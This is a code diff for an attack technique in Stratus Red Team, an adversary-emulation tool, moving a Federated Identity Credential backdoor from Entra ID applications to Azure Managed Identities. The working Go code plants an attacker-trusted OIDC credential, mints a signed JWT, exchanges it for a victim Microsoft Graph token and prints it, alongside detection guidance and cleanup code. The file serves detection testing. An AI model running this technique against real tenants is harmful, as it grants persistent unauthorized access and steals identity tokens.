@@ -1,4 +1,4 @@
-package entra_id
+package azure
 
 import (
 	"context"
@@ -16,6 +16,7 @@ import (
 	"net/url"
 	"time"
 
+	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/msi/armmsi"
 	"github.com/Azure/azure-sdk-for-go/sdk/storage/azblob"
 	jwt "github.com/golang-jwt/jwt/v4"
 	"github.com/google/uuid"
@@ -23,7 +24,6 @@ import (
 	"github.com/datadog/stratus-red-team/v2/internal/providers"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
-	graphmodels "github.com/microsoftgraph/msgraph-sdk-go/models"
 )
 
 //go:embed main.tf
@@ -36,7 +36,6 @@ const (
 	ficName           = "stratus-red-team-oidc-fic"
 	tokenTTL          = 10 * time.Minute
 	ficWaitTime       = 30 * time.Second
-	techniqueID       = "entra-id.persistence.backdoor-application-fic"
 )
 
 type oidcDiscovery struct {
@@ -62,14 +61,14 @@ type jwkSet struct {
 
 func init() {
 	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
-		ID:           techniqueID,
-		FriendlyName: "Backdoor Entra ID application with Federated Identity Credential (FIC)",
+		ID:           "azure.persistence.backdoor-managed-identity-fic",
+		FriendlyName: "Backdoor Azure Managed Identity with Federated Identity Credential (FIC)",
 		Description: `
-Backdoors an existing Entra ID application by creating a new Federated Identity Credential (FIC) that trusts an attacker-controlled OIDC provider.
+Backdoors an existing Azure Managed Identity by creating a new Federated Identity Credential (FIC) that trusts an attacker-controlled OIDC provider.
 
 Warm-up:
 
-- Create a victim Entra ID application and associated service principal
+- Create a resource group and victim Azure Managed Identity
 - Assign it the <code>Directory Readers</code> role at the tenant level (for illustration purposes)
 - Create an Azure Storage account to host the attacker-controlled OIDC provider metadata
 
@@ -77,10 +76,10 @@ Detonation:
 
 - Generate a keypair to use for OIDC
 - Upload OIDC discovery document and JWKS to the storage account
-- Add a Federated Identity Credential (FIC) to the victim application that trusts tokens issued by the malicious OIDC provider
-- Mint a JWT signed by the attacker's OIDC private key
-- Exchange the attacker's token for a victim application token using the FIC
-- Display the victim application's access token to the user
+- Add a Federated Identity Credential (FIC) to the victim Managed Identity that trusts tokens issued by the malicious OIDC provider
+- Create a token signed by the attacker's OIDC private key to exchange for a token as the victim Managed Identity
+- Exchange the attacker's token for a Microsoft Graph token as the victim Managed Identity using the FIC
+- Display the victim Managed Identity's access token to the user
 
 References:
 
@@ -88,12 +87,11 @@ References:
 - https://github.com/azurekid/blackcat/pull/84/changes
 - https://learn.microsoft.com/en-us/graph/api/resources/federatedidentitycredentials-overview
 - https://hackingthe.cloud/aws/post_exploitation/iam_rogue_oidc_identity_provider/
-
 `,
 		Detection: `
-Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/concept-audit-logs) with the activity type <code>Update application</code>, where <code>ModifiedProperties</code> contains a <code>displayName</code> of <code>Included Updated Properties</code> and a value of <code>FederatedIdentityCredentials</code>.
+Using [Azure Activity Logs](https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log) with the operation name <code>Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write</code>.
 `,
-		Platform:                   stratus.EntraID,
+		Platform:                   stratus.Azure,
 		IsIdempotent:               false,
 		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Persistence, mitreattack.PrivilegeEscalation},
 		PrerequisitesTerraformCode: tf,
@@ -103,14 +101,17 @@ Using [Entra ID audit logs](https://learn.microsoft.com/en-us/entra/identity/mon
 }
 
 func detonate(params map[string]string, providers stratus.CloudProviders) error {
-	victimObjectId := params["object_id"]
-	victimAppId := params["app_id"]
+	ctx := context.Background()
+
+	managedIdentityName := params["managed_identity_name"]
+	managedIdentityClientId := params["managed_identity_client_id"]
+	resourceGroupName := params["resource_group_name"]
 	storageAccountName := params["storage_account_name"]
 	blobServiceURL := params["blob_service_url"]
 
-	graphClient := providers.EntraId().GetGraphClient()
 	azureProvider := providers.Azure()
 
+	subscriptionId := azureProvider.SubscriptionID
 	tenantId, err := providers.EntraId().GetTenantId()
 	if err != nil {
 		return fmt.Errorf("could not retrieve tenant ID: %w", err)
@@ -132,26 +133,31 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 		return fmt.Errorf("could not upload OIDC documents: %w", err)
 	}
 
-	// Add FIC to the victim application, trusting the attacker OIDC provider
-	log.Println("Adding Federated Identity Credential to victim application...")
+	// Create FIC client for managed identity operations
+	ficClient, err := armmsi.NewFederatedIdentityCredentialsClient(subscriptionId, azureProvider.GetCredentials(), nil)
+	if err != nil {
+		return fmt.Errorf("could not create FIC client: %w", err)
+	}
+
+	// Add FIC to the victim managed identity, trusting the attacker OIDC provider
+	log.Println("Adding Federated Identity Credential to victim managed identity...")
 	ficIssuer := issuerURL
 	ficSubject := oidcSubject
-	ficDescription := "Federated credential trusting attacker-controlled OIDC provider"
-	ficAudiences := []string{oidcAudience}
-	ficNameStr := ficName
+	ficAudiences := []*string{strPtr(oidcAudience)}
 
-	requestBody := graphmodels.NewFederatedIdentityCredential()
-	requestBody.SetName(&ficNameStr)
-	requestBody.SetIssuer(&ficIssuer)
-	requestBody.SetSubject(&ficSubject)
-	requestBody.SetDescription(&ficDescription)
-	requestBody.SetAudiences(ficAudiences)
+	ficParams := armmsi.FederatedIdentityCredential{
+		Properties: &armmsi.FederatedIdentityCredentialProperties{
+			Issuer:    &ficIssuer,
+			Subject:   &ficSubject,
+			Audiences: ficAudiences,
+		},
+	}
 
-	fic, err := graphClient.Applications().ByApplicationId(victimObjectId).FederatedIdentityCredentials().Post(context.Background(), requestBody, nil)
+	fic, err := ficClient.CreateOrUpdate(ctx, resourceGroupName, managedIdentityName, ficName, ficParams, nil)
 	if err != nil {
 		return fmt.Errorf("could not create FIC: %w", err)
 	}
-	log.Printf("Created FIC with ID %s (issuer: %s, subject: %s)", *fic.GetId(), issuerURL, oidcSubject)
+	log.Printf("Created FIC '%s' (issuer: %s, subject: %s)", *fic.Name, issuerURL, oidcSubject)
 
 	// Wait for FIC and OIDC metadata to propagate
 	log.Printf("Waiting %s for FIC and OIDC metadata to propagate...", ficWaitTime)
@@ -164,51 +170,66 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 		return fmt.Errorf("could not create OIDC token: %w", err)
 	}
 
-	// Exchange the attacker JWT for a victim application access token
-	log.Println("Exchanging OIDC token for victim application access token via FIC...")
-	victimToken, err := exchangeTokenUsingFIC(tenantId, victimAppId, oidcToken)
+	// Exchange the attacker JWT for a victim managed identity access token
+	log.Println("Exchanging OIDC token for victim managed identity access token via FIC...")
+	victimToken, err := exchangeTokenUsingFIC(tenantId, managedIdentityClientId, oidcToken)
 	if err != nil {
 		return fmt.Errorf("could not exchange token via FIC: %w", err)
 	}
 
-	log.Println("Obtained victim application access token via malicious OIDC FIC backdoor")
-	log.Println("\nVictim application Microsoft Graph token:")
+	log.Println("Obtained victim managed identity access token via malicious OIDC FIC backdoor")
+	log.Println("\nVictim managed identity Microsoft Graph token:")
 	log.Println(victimToken)
 
-	log.Println("\nYou can now use this token to access Microsoft Graph API as the victim application:")
-	log.Println("\nWARNING: Using this command in your current CLI session will change your Azure context. You will need to LOG IN AGAIN to clean up this technique.")
-	log.Println("\naz login --service-principal --allow-no-subscriptions --tenant " + tenantId + " --username " + victimAppId + " --federated-token \"" + oidcToken + "\"")
+	log.Println("\nYou can now use this token to access Microsoft Graph API as the victim managed identity.")
+
 	return nil
 }
 
 func revert(params map[string]string, providers stratus.CloudProviders) error {
-	victimObjectId := params["object_id"]
+	ctx := context.Background()
+
+	managedIdentityName := params["managed_identity_name"]
+	resourceGroupName := params["resource_group_name"]
 	blobServiceURL := params["blob_service_url"]
-	graphClient := providers.EntraId().GetGraphClient()
+
 	azureProvider := providers.Azure()
+	subscriptionId := azureProvider.SubscriptionID
 
-	// Remove FICs from the victim application
-	log.Println("Listing FICs for application " + victimObjectId)
-	fics, err := graphClient.Applications().ByApplicationId(victimObjectId).FederatedIdentityCredentials().Get(context.Background(), nil)
+	// Create FIC client for managed identity operations
+	ficClient, err := armmsi.NewFederatedIdentityCredentialsClient(subscriptionId, azureProvider.GetCredentials(), nil)
 	if err != nil {
-		return errors.New("could not retrieve FICs: " + err.Error())
+		return fmt.Errorf("could not create FIC client: %w", err)
 	}
 
-	for _, credential := range fics.GetValue() {
-		ficId := credential.GetId()
-		if ficId == nil {
-			continue
-		}
-		log.Println("Deleting FIC with ID " + *ficId)
-		err := graphClient.Applications().ByApplicationId(victimObjectId).FederatedIdentityCredentials().ByFederatedIdentityCredentialId(*ficId).Delete(context.Background(), nil)
+	// List and remove FICs from the victim managed identity
+	log.Println("Listing FICs for managed identity " + managedIdentityName)
+	pager := ficClient.NewListPager(resourceGroupName, managedIdentityName, nil)
+
+	ficCount := 0
+	for pager.More() {
+		page, err := pager.NextPage(ctx)
 		if err != nil {
-			return errors.New("could not delete FIC: " + err.Error())
+			return fmt.Errorf("could not list FICs: %w", err)
+		}
+
+		for _, credential := range page.Value {
+			if credential.Name == nil {
+				continue
+			}
+			log.Println("Deleting FIC: " + *credential.Name)
+			_, err := ficClient.Delete(ctx, resourceGroupName, managedIdentityName, *credential.Name, nil)
+			if err != nil {
+				return fmt.Errorf("could not delete FIC: %w", err)
+			}
+			ficCount++
 		}
 	}
-	if len(fics.GetValue()) == 0 {
+
+	if ficCount == 0 {
 		log.Println("No FICs found to delete")
 	} else {
-		log.Println("Successfully removed FIC(s) from victim application")
+		log.Printf("Successfully removed %d FIC(s) from victim managed identity", ficCount)
 	}
 
 	// Delete the OIDC container (storage account is managed by Terraform)
@@ -220,6 +241,10 @@ func revert(params map[string]string, providers stratus.CloudProviders) error {
 	}
 
 	return nil
+}
+
+func strPtr(s string) *string {
+	return &s
 }
 
 // deleteOIDCContainer deletes the OIDC container from the storage account.
@@ -305,7 +330,7 @@ func mintOIDCToken(privateKey *rsa.PrivateKey, keyID, issuerURL string) (string,
 	return token.SignedString(privateKey)
 }
 
-// exchangeTokenUsingFIC exchanges a client assertion JWT for a victim app token using the FIC.
+// exchangeTokenUsingFIC exchanges a client assertion JWT for a victim managed identity token using the FIC.
 func exchangeTokenUsingFIC(tenantId, victimClientId, clientAssertion string) (string, error) {
 	tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", tenantId)
 
